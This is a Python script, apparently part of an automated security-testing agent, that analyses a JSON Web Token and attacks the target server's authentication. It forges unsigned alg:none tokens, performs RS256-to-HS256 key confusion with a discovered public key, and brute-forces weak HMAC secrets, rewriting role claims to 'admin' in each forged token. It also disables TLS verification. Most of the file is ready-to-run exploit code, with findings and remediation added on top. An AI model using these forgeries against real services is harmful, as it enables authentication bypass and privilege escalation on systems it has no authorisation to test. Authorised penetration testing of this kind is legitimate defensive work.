#!/usr/bin/env python3
"""
jwt_tool_handler.py — Automated JWT security testing (A07).

Runs standalone or as a Docker image. Pure stdlib. Outputs structured JSON
that the agent interprets. Validates every attack with 3 baselines to
avoid false positives (a 200 is NOT evidence of bypass).

Usage:
    python jwt_tool_handler.py --target URL --token JWT [--output FILE]
"""
import argparse
import base64
import hashlib
import hmac
import json
import ssl
import sys
import urllib.error
import urllib.request
from datetime import datetime, timezone

# ---- Configuration --------------------------------------------------------

TEST_PATHS = [
    "/api/Users/", "/api/users", "/api/user/me", "/api/me",
    "/whoami", "/me", "/profile", "/api/profile",
    "/rest/user/whoami", "/api/v1/users", "/users", "/api/accounts",
]

PUBKEY_PATHS = [
    "/encryptionkeys/jwt.pub", "/.well-known/jwks.json",
    "/jwks.json", "/pubkey.pem", "/api/auth/public-key",
]

ROLE_NAMES = {
    "role", "roles", "is_admin", "isadmin", "admin",
    "scope", "scopes", "permissions", "groups",
    "user_type", "usertype", "account_type",
}

SENSITIVE_NAMES = {
    "password", "passwd", "pwd", "secret", "apikey", "api_key",
    "private_key", "ssn", "credit_card", "card_number",
}

# ---- JWT utilities (stdlib only) ------------------------------------------

def b64d(data):
    if isinstance(data, str): data = data.encode()
    pad = 4 - len(data) % 4
    if pad != 4: data += b"=" * pad
    return base64.urlsafe_b64decode(data)

def b64e(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")
    return {
        "header": json.loads(b64d(parts[0])),
        "payload": json.loads(b64d(parts[1])),
        "signature": parts[2],
    }

def find_role_path(payload, path=""):
    """Recursively find a role-like claim."""
    if isinstance(payload, dict):
        for k, v in payload.items():
            cur = f"{path}.{k}" if path else k
            if k.lower() in ROLE_NAMES and isinstance(v, str):
                return cur, v
            res = find_role_path(v, cur)
            if res: return res
    return None, None

def find_sensitive(payload, path=""):
    """Recursively find sensitive claims."""
    found = []
    if isinstance(payload, dict):
        for k, v in payload.items():
            cur = f"{path}.{k}" if path else k
            if k.lower() in SENSITIVE_NAMES and isinstance(v, str):
                preview = v[:12] + "..." if len(v) > 12 else v
                found.append({"path": cur, "value_preview": preview, "length": len(v)})
            found.extend(find_sensitive(v, cur))
    return found

def set_nested(d, path, value):
    node = d
    parts = path.split(".")
    for p in parts[:-1]:
        node = node[p]
    node[parts[-1]] = value

# ---- HTTP (stdlib only, no external deps) ---------------------------------

def http(url, method="GET", headers=None, body=None, timeout=10):
    req = urllib.request.Request(url, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    if body is not None:
        req.data = body.encode() if isinstance(body, str) else body
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            data = r.read()
            return {"status": r.status, "size": len(data),
                    "body": data.decode("utf-8", errors="replace")}
    except urllib.error.HTTPError as e:
        data = e.read()
        return {"status": e.code, "size": len(data),
                "body": data.decode("utf-8", errors="replace")}
    except Exception as e:
        return {"status": 0, "size": 0, "body": "", "error": str(e)}

# ---- Attack forgers -------------------------------------------------------

def forge_alg_none(payload):
    """Unsigned token with alg=none."""
    h = b64e(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h.decode()}.{p.decode()}."

def forge_hs256(payload, secret_bytes):
    """HS256 token signed with given bytes (pubkey or guessed secret)."""
    h = b64e(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = h + b"." + p
    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + b64e(sig)).decode()

# ---- 3-baseline validation ------------------------------------------------

def validate_attack(target, forged_token, customer_token,
                    auth_header="Authorization", auth_prefix="Bearer "):
    """The critical piece — a 200 is NOT enough."""
    r_none = http(target)
    r_cust = http(target, headers={auth_header: f"{auth_prefix}{customer_token}"})
    r_forg = http(target, headers={auth_header: f"{auth_prefix}{forged_token}"})

    success, reason = False, "unknown"
    if r_forg["status"] == 0:
        reason = "request_failed"
    elif r_forg["status"] == 401:
        reason = "signature_rejected"
    elif r_forg["status"] == 403:
        reason = "forbidden"
    elif r_forg["status"] == 200:
        if r_none["status"] == 200:
            reason = "endpoint_public_no_auth_required"
        else:
            # Forged token passed where no-auth failed → real bypass
            success = True
            reason = ("auth_bypass_confirmed" if r_cust["status"] != 200
                      else "auth_bypass_both_tokens_accepted")

    return {
        "success": success,
        "reason": reason,
        "baselines": {
            "no_auth": {"status": r_none["status"], "size": r_none["size"]},
            "customer": {"status": r_cust["status"], "size": r_cust["size"]},
            "forged": {"status": r_forg["status"], "size": r_forg["size"]},
        },
        "body_preview": r_forg["body"][:800] if r_forg["body"] else "",
    }

# ---- Discovery ------------------------------------------------------------

def discover_test_endpoint(base, customer_token):
    """Find a URL that returns 401 without auth and 200 with valid token."""
    for path in TEST_PATHS:
        url = base.rstrip("/") + path
        r_none = http(url)
        if r_none["status"] != 401:
            continue
        r_auth = http(url, headers={"Authorization": f"Bearer {customer_token}"})
        if r_auth["status"] == 200:
            return {"url": url, "path": path,
                    "no_auth_status": 401, "auth_status": 200}
    return None

def discover_pubkey(base):
    for path in PUBKEY_PATHS:
        url = base.rstrip("/") + path
        r = http(url)
        if r["status"] == 200 and len(r["body"]) > 50 and "-----" in r["body"]:
            return {"url": url, "pem": r["body"]}
        if r["status"] == 200 and r["body"].strip().startswith("{"):
            return {"url": url, "jwks": r["body"]}  # JWKS format
    return None

# ---- Attacks --------------------------------------------------------------

def attack_alg_none(endpoint, decoded, customer_token):
    payload = decoded["payload"].copy()
    # Try to escalate role if present
    role_path, role_val = find_role_path(payload)
    if role_path:
        set_nested(payload, role_path, "admin")
    forged = forge_alg_none(payload)
    validation = validate_attack(endpoint, forged, customer_token)
    return {
        "attempted": True,
        "success": validation["success"],
        "reason": validation["reason"],
        "forged_token": forged,
        "role_modified": {"path": role_path, "from": role_val, "to": "admin"} if role_path else None,
        "validation": validation,
    }

def attack_key_confusion(endpoint, decoded, customer_token, base):
    pub = discover_pubkey(base)
    if not pub:
        return {"attempted": False, "reason": "public_key_not_found"}
    if "jwks" in pub:
        return {"attempted": False, "reason": "jwks_found_but_not_implemented",
                "jwks_url": pub["url"]}
    payload = decoded["payload"].copy()
    role_path, role_val = find_role_path(payload)
    if role_path:
        set_nested(payload, role_path, "admin")
    forged = forge_hs256(payload, pub["pem"].encode())
    validation = validate_attack(endpoint, forged, customer_token)
    return {
        "attempted": True,
        "success": validation["success"],
        "reason": validation["reason"],
        "pubkey_url": pub["url"],
        "forged_token": forged,
        "role_modified": {"path": role_path, "from": role_val, "to": "admin"} if role_path else None,
        "validation": validation,
    }

def attack_weak_secret(endpoint, decoded, customer_token, wordlist=None):
    """Only for HS* algorithms. Brute-force the HMAC secret."""
    if not wordlist:
        wordlist = ["secret", "password", "123456", "jwt", "changeme", "key", "admin"]
    for guess in wordlist:
        payload = decoded["payload"].copy()
        role_path, _ = find_role_path(payload)
        if role_path:
            set_nested(payload, role_path, "admin")
        forged = forge_hs256(payload, guess.encode())
        # Cheap test: send and see if 200
        r = http(endpoint, headers={"Authorization": f"Bearer {forged}"})
        if r["status"] == 200:
            validation = validate_attack(endpoint, forged, customer_token)
            return {
                "attempted": True, "success": True,
                "reason": "weak_secret_cracked",
                "cracked_secret": guess,
                "validation": validation,
            }
    return {"attempted": True, "success": False, "reason": "no_weak_secret_found",
            "attempts": len(wordlist)}

# ---- Analysis + findings --------------------------------------------------

def analyze_jwt(decoded, token):
    h, p = decoded["header"], decoded["payload"]
    alg = h.get("alg", "unknown")
    role_path, role_val = find_role_path(p)
    sensitive = find_sensitive(p)

    weaknesses = []
    if alg.lower() == "none":
        weaknesses.append({"id": "alg_none_accepted", "severity": "CRITICAL"})
    if "exp" not in p:
        weaknesses.append({"id": "no_expiration", "severity": "HIGH",
                          "description": "Token never expires"})
    if "iss" not in p and "aud" not in p:
        weaknesses.append({"id": "no_iss_aud", "severity": "MEDIUM"})
    if sensitive:
        weaknesses.append({"id": "sensitive_data_in_payload", "severity": "HIGH",
                          "items": sensitive})
    if role_path and role_val:
        weaknesses.append({"id": "role_in_payload", "severity": "MEDIUM",
                          "path": role_path, "value": role_val})
    if alg.startswith("HS"):
        weaknesses.append({"id": "symmetric_algorithm", "severity": "MEDIUM",
                          "description": "Weak secret brute-forcible"})
    if alg.startswith(("RS", "PS", "ES")):
        weaknesses.append({"id": "asymmetric_algorithm", "severity": "LOW",
                          "description": "Try key confusion attack"})

    return {
        "algorithm": alg,
        "algorithm_family": "asymmetric" if alg.startswith(("RS","PS","ES")) else "symmetric",
        "claims_present": list(p.keys()),
        "claims_missing": [c for c in ["exp","nbf","iss","aud","sub","jti"] if c not in p],
        "role_claim": {"path": role_path, "value": role_val} if role_path else None,
        "sensitive_claims": sensitive,
        "weaknesses": weaknesses,
        "signature_bytes": len(decoded["signature"]),
    }

def consolidate_findings(analysis, attacks, discovery):
    findings = []
    # From analysis
    for w in analysis["weaknesses"]:
        findings.append({
            "id": f"A07-{len(findings)+1:02d}",
            "severity": w["severity"],
            "title": w["id"].replace("_", " ").title(),
            "description": w.get("description", ""),
            "source": "jwt_analysis",
        })
    # From attacks
    if attacks.get("alg_none", {}).get("success"):
        findings.append({
            "id": f"A07-{len(findings)+1:02d}",
            "severity": "CRITICAL",
            "title": "JWT alg:none bypass — authentication completely bypassed",
            "description": (f"Server accepted unsigned JWT at {discovery['url']} "
                           "returning HTTP 200 with protected data. Complete auth bypass."),
            "source": "attack:alg_none",
            "evidence": {
                "forged_token": attacks["alg_none"]["forged_token"][:100] + "...",
                "response_size": attacks["alg_none"]["validation"]["baselines"]["forged"]["size"],
                "baselines": attacks["alg_none"]["validation"]["baselines"],
            },
            "remediation": "Enforce algorithm whitelist. Reject alg=none explicitly.",
        })
    if attacks.get("key_confusion", {}).get("success"):
        findings.append({
            "id": f"A07-{len(findings)+1:02d}",
            "severity": "CRITICAL",
            "title": "JWT key confusion (RS256 → HS256) — signature bypass",
            "description": "Server accepts HS256 tokens signed with the public key.",
            "source": "attack:key_confusion",
            "remediation": "Pin algorithm per token. Never use RSA pubkey as HMAC secret.",
        })
    if attacks.get("weak_secret", {}).get("success"):
        findings.append({
            "id": f"A07-{len(findings)+1:02d}",
            "severity": "CRITICAL",
            "title": f"Weak HMAC secret cracked: '{attacks['weak_secret']['cracked_secret']}'",
            "source": "attack:weak_secret",
        })
    return findings

# ---- Main orchestrator ----------------------------------------------------

def run_jwt_attack(target, token, test_endpoint=None):
    decoded = decode_jwt(token)
    analysis = analyze_jwt(decoded, token)

    # Discovery
    if test_endpoint:
        discovery = {"url": target.rstrip("/") + test_endpoint, "source": "provided"}
    else:
        disc = discover_test_endpoint(target, token)
        if not disc:
            return {
                "tool": "jwt_tool_handler", "target": target,
                "error": "no_test_endpoint_found",
                "hint": "Provide --test-endpoint or ensure target has a 401-protected path",
                "jwt_analysis": analysis,
            }
        discovery = {"url": disc["url"], "path": disc["path"],
                     "source": "auto_discovered"}

    # Attacks
    attacks = {}
    attacks["alg_none"] = attack_alg_none(discovery["url"], decoded, token)

    alg = decoded["header"].get("alg", "")
    if alg.startswith(("RS", "PS", "ES")):
        attacks["key_confusion"] = attack_key_confusion(
            discovery["url"], decoded, token, target)
    elif alg.startswith("HS"):
        attacks["weak_secret"] = attack_weak_secret(
            discovery["url"], decoded, token)

    findings = consolidate_findings(analysis, attacks, discovery)

    severities = [f["severity"] for f in findings]
    risk = ("CRITICAL" if "CRITICAL" in severities else
            "HIGH" if "HIGH" in severities else
            "MEDIUM" if "MEDIUM" in severities else "LOW")

    return {
        "tool": "jwt_tool_handler",
        "version": "1.0.0",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": target,
        "discovery": discovery,
        "jwt_analysis": analysis,
        "attacks": attacks,
        "findings": findings,
        "summary": {
            "total_findings": len(findings),
            "critical": severities.count("CRITICAL"),
            "high": severities.count("HIGH"),
            "medium": severities.count("MEDIUM"),
            "low": severities.count("LOW"),
            "risk_level": risk,
            "attacks_succeeded": sum(1 for a in attacks.values() if a.get("success")),
        },
    }

# ---- CLI ------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="Automated JWT security testing")
    ap.add_argument("--target", required=True, help="Base URL (e.g. http://juice-shop-target:3000)")
    ap.add_argument("--token", required=True, help="Original JWT to analyze/attack")
    ap.add_argument("--test-endpoint", help="Override auto-discovery (e.g. /api/Users/)")
    ap.add_argument("--output", help="Write JSON to file")
    args = ap.parse_args()

    result = run_jwt_attack(args.target, args.token, args.test_endpoint)
    json_str = json.dumps(result, indent=2)
    print(json_str)
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(json_str)

if __name__ == "__main__":
    main()